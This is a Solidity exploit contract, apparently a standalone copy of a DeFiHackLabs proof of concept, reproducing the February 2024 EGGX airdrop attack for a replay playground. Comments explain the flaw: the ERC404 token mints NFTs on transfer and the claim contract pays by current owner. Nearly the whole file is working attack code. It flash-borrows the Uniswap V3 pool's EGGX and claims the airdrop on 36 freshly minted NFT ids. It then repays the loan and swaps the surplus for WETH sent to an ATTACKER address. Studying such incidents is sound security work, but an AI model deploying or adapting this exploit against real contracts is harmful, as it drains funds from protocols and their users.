// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-02-EGGX).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (ContractTest itself receives the flash loan and implements the Uniswap V3
// flash/swap callbacks), so there is no standalone contract to deploy. This
// contract is a faithful, self-contained copy of that inline attack
// (testExploit + uniswapV3FlashCallback + uniswapV3SwapCallback) so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/EGGX_exp.sol.
//
// Root cause: EGGX is an ERC404 token that auto-mints NFTs to any
// non-whitelisted address whenever its fractional balance crosses a unit
// boundary. EGGXClaim.check(ids) pays a fixed per-NFT airdrop based only on
// the CURRENT ownerOf(id), with no snapshot of legitimate participants. By
// flash-borrowing the entire EGGX balance of the Uniswap V3 pool, the
// attacker mints ~1,209 brand-new NFTs for free, claims the airdrop on 36 of
// them (288,000 EGGX), repays the flash loan + fee, and sells the EGGX
// surplus back through the pool for ~1.9878 WETH profit.

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IEGGXUNIV3POOL {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external;
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IEGGX is IERC20 {
    function ownerOf(uint256 id) external view returns (address);
}

interface IEGGXClaim {
    function check(uint256[] memory ids) external;
}

contract EGGXDrain {
    IEGGXUNIV3POOL constant pool = IEGGXUNIV3POOL(0x26beBB6995a4736F088D129E82620eBA899B944F);
    IEGGX constant EGGX = IEGGX(0xe2f95ee8B72fFed59bC4D2F35b1d19b909A6e6b3);
    IEGGXClaim constant EGGXCliam = IEGGXClaim(0xFb35DE57B117FA770761C1A344784075745F84F9);
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address constant ATTACKER = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496;

    // step 0: approve the pool for both legs, then flash-borrow the pool's
    // ENTIRE EGGX balance. Receiving it mints ~1,209 fresh NFTs to this
    // (non-whitelisted) contract for free.
    function run() external {
        WETH.approve(address(pool), type(uint256).max);
        EGGX.approve(address(pool), type(uint256).max);

        bytes memory pollbalance = abi.encode(EGGX.balanceOf(address(pool)));
        pool.flash(address(this), 0, EGGX.balanceOf(address(pool)), pollbalance);

        // step 4 (after flash repay in the callback): sell the leftover EGGX
        // surplus back through the pool for WETH, then forward the profit.
        bool zeroForOne = false;
        uint160 sqrtPriceLimitX96 = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341;
        bytes memory data = abi.encodePacked(uint8(0x61));
        int256 amountSpecified = int256(EGGX.balanceOf(address(this)));
        pool.swap(address(this), zeroForOne, amountSpecified, sqrtPriceLimitX96, data);

        WETH.transfer(ATTACKER, WETH.balanceOf(address(this)));
    }

    // step 1-3: called by the pool mid-flash. Harvest the per-NFT airdrop on
    // 36 of the freshly-minted NFT ids (6 batches of 6), then repay the flash
    // loan (principal + fee1) from the claimed EGGX.
    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        uint256 pollbalance = abi.decode(data, (uint256));
        uint256[] memory nftid = new uint256[](6);

        nftid[0] = 30_342;
        nftid[1] = 30_319;
        nftid[2] = 30_031;
        nftid[3] = 30_036;
        nftid[4] = 30_028;
        nftid[5] = 30_019;
        EGGXCliam.check(nftid);

        nftid[0] = 30_379;
        nftid[1] = 30_363;
        nftid[2] = 30_169;
        nftid[3] = 30_267;
        nftid[4] = 30_098;
        nftid[5] = 30_484;
        EGGXCliam.check(nftid);

        nftid[0] = 30_281;
        nftid[1] = 30_217;
        nftid[2] = 30_245;
        nftid[3] = 30_192;
        nftid[4] = 30_027;
        nftid[5] = 30_181;
        EGGXCliam.check(nftid);

        nftid[0] = 30_368;
        nftid[1] = 30_488;
        nftid[2] = 30_259;
        nftid[3] = 30_284;
        nftid[4] = 30_084;
        nftid[5] = 30_395;
        EGGXCliam.check(nftid);

        nftid[0] = 30_408;
        nftid[1] = 30_111;
        nftid[2] = 30_365;
        nftid[3] = 30_144;
        nftid[4] = 30_176;
        nftid[5] = 30_054;
        EGGXCliam.check(nftid);

        nftid[0] = 30_039;
        nftid[1] = 30_045;
        nftid[2] = 30_030;
        nftid[3] = 30_070;
        nftid[4] = 30_055;
        nftid[5] = 30_213;
        EGGXCliam.check(nftid);

        EGGX.transfer(address(pool), pollbalance + fee1);
    }

    // step 4a: the V3 pool calls back during the final swap to pull the EGGX
    // (or WETH) leg it is owed.
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        if (amount0Delta > 0) {
            IERC20(IEGGXUNIV3POOL(msg.sender).token0()).transfer(msg.sender, uint256(amount0Delta));
        } else if (amount1Delta > 0) {
            IERC20(IEGGXUNIV3POOL(msg.sender).token1()).transfer(msg.sender, uint256(amount1Delta));
        }
    }
}
